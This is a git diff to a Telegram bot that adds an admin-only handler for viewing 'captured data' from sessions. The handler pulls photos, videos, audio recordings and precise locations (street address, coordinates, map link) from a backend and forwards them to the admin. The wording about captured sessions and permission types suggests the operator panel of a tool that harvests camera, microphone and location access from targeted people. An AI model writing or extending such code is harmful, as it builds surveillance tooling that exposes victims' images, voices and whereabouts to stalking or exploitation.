@@ -836,16 +836,150 @@ bot.action(/^viewuser_(\d+)$/, async (ctx) => {
                 const statusEmoji = s.status === 'active' ? '🟢' : s.status === 'ended' ? '⚫' : '🔴';
                 msg += `${i + 1}. ${statusEmoji} ${s.permissionType} (${s.mediaCount} files)\n`;
             });
+            msg += `\n_Tap a session below to view captured data_`;
         }
         
         await ctx.editMessageText(msg, {
             parse_mode: 'Markdown',
-            ...userDetailKeyboard(targetTelegramId, user.isApproved)
+            ...userDetailKeyboard(targetTelegramId, user.isApproved, sessions)
         });
         
     } catch (error) {
         logger.error('Failed to get user data', { error: error.message });
         await ctx.reply('❌ Failed to load user data: ' + error.message);
+    }
+});
+
+/**
+ * Handle view session data (admin)
+ */
+bot.action(/^viewsession_(.+)$/, async (ctx) => {
+    const adminUser = ctx.from;
+    const sessionId = ctx.match[1];
+    
+    if (!isAdmin(adminUser.id)) {
+        await ctx.answerCbQuery('❌ Admin access required');
+        return;
+    }
+    
+    await ctx.answerCbQuery('Loading session data...');
+    
+    try {
+        const result = await api.getSessionMedia(sessionId);
+        
+        if (!result.success) {
+            throw new Error(result.error || 'Failed to get media');
+        }
+        
+        const { counts, media, permissionType } = result;
+        const totalItems = counts.photos + counts.videos + counts.audio + counts.locations;
+        
+        if (totalItems === 0) {
+            await ctx.reply('📭 No data captured in this session.');
+            return;
+        }
+        
+        // Summary message
+        let summaryMsg = `📂 <b>SESSION DATA (Admin View)</b>\n\n`;
+        summaryMsg += `<b>Type:</b> ${config.permissions[permissionType]?.label || permissionType}\n\n`;
+        summaryMsg += `<b>📊 Captured Data:</b>\n`;
+        if (counts.photos > 0) summaryMsg += `  📷 Photos: ${counts.photos}\n`;
+        if (counts.videos > 0) summaryMsg += `  🎥 Videos: ${counts.videos}\n`;
+        if (counts.audio > 0) summaryMsg += `  🎤 Audio: ${counts.audio}\n`;
+        if (counts.locations > 0) summaryMsg += `  📍 Locations: ${counts.locations}\n`;
+        
+        await ctx.reply(summaryMsg, { parse_mode: 'HTML' });
+        
+        // Send locations with full details
+        if (media.locations && media.locations.length > 0) {
+            for (let i = 0; i < media.locations.length; i++) {
+                const loc = media.locations[i];
+                const data = loc.metadata;
+                
+                let locMsg = `📍 <b>LOCATION ${i + 1}</b>\n`;
+                locMsg += `🕐 ${new Date(loc.createdAt).toLocaleString()}\n\n`;
+                
+                if (data.address) {
+                    locMsg += `📌 <b>Address:</b>\n${data.address.formatted || data.address.displayName}\n\n`;
+                    if (data.address.street) locMsg += `🏠 Street: ${data.address.street}\n`;
+                    if (data.address.neighborhood) locMsg += `🏘️ Area: ${data.address.neighborhood}\n`;
+                    if (data.address.city) locMsg += `🌆 City: ${data.address.city}\n`;
+                    if (data.address.state) locMsg += `🗺️ State: ${data.address.state}\n`;
+                    if (data.address.country) locMsg += `🌍 Country: ${data.address.country}\n`;
+                    if (data.address.postalCode) locMsg += `📮 Postal: ${data.address.postalCode}\n`;
+                }
+                
+                if (data.coordinates) {
+                    locMsg += `\n🎯 <b>Coordinates:</b>\n`;
+                    locMsg += `├ Lat: <code>${data.coordinates.latitude?.toFixed(6)}</code>\n`;
+                    locMsg += `├ Lng: <code>${data.coordinates.longitude?.toFixed(6)}</code>\n`;
+                    if (data.coordinates.accuracy) locMsg += `├ Accuracy: ${data.coordinates.accuracy.toFixed(1)}m\n`;
+                }
+                
+                if (data.maps) {
+                    locMsg += `\n🗺️ <a href="${data.maps.googleMaps}">Open in Google Maps</a>`;
+                }
+                
+                await ctx.reply(locMsg, { parse_mode: 'HTML', disable_web_page_preview: false });
+            }
+        }
+        
+        // Send photos
+        if (media.photos && media.photos.length > 0) {
+            for (let i = 0; i < media.photos.length; i++) {
+                const photo = media.photos[i];
+                try {
+                    const photoUrl = `${config.api.baseUrl}/api/sessions/${sessionId}/media/${photo.id}/file`;
+                    await ctx.replyWithPhoto(
+                        { url: photoUrl },
+                        { caption: `📷 Photo ${i + 1} - ${new Date(photo.createdAt).toLocaleString()}` }
+                    );
+                } catch (photoErr) {
+                    logger.error('Failed to send photo', { error: photoErr.message });
+                    await ctx.reply(`📷 Photo ${i + 1} - File: ${photo.fileName}`);
+                }
+            }
+        }
+        
+        // Send videos
+        if (media.videos && media.videos.length > 0) {
+            for (let i = 0; i < media.videos.length; i++) {
+                const video = media.videos[i];
+                try {
+                    const videoUrl = `${config.api.baseUrl}/api/sessions/${sessionId}/media/${video.id}/file`;
+                    await ctx.replyWithVideo(
+                        { url: videoUrl },
+                        { caption: `🎥 Video ${i + 1} - ${new Date(video.createdAt).toLocaleString()}` }
+                    );
+                } catch (videoErr) {
+                    logger.error('Failed to send video', { error: videoErr.message });
+                    await ctx.reply(`🎥 Video ${i + 1} - File: ${video.fileName}`);
+                }
+            }
+        }
+        
+        // Send audio
+        if (media.audio && media.audio.length > 0) {
+            for (let i = 0; i < media.audio.length; i++) {
+                const audio = media.audio[i];
+                try {
+                    const audioUrl = `${config.api.baseUrl}/api/sessions/${sessionId}/media/${audio.id}/file`;
+                    await ctx.replyWithAudio(
+                        { url: audioUrl },
+                        { caption: `🎤 Audio ${i + 1} - ${new Date(audio.createdAt).toLocaleString()}` }
+                    );
+                } catch (audioErr) {
+                    logger.error('Failed to send audio', { error: audioErr.message });
+                    await ctx.reply(`🎤 Audio ${i + 1} - File: ${audio.fileName}`);
+                }
+            }
+        }
+        
+        logger.info('Admin viewed session data', { sessionId, adminId: adminUser.id });
+        
+    } catch (error) {
+        logger.error('Failed to get session data', { error: error.message });
+        await ctx.reply('❌ Failed to load session data: ' + error.message);
     }
 });
 
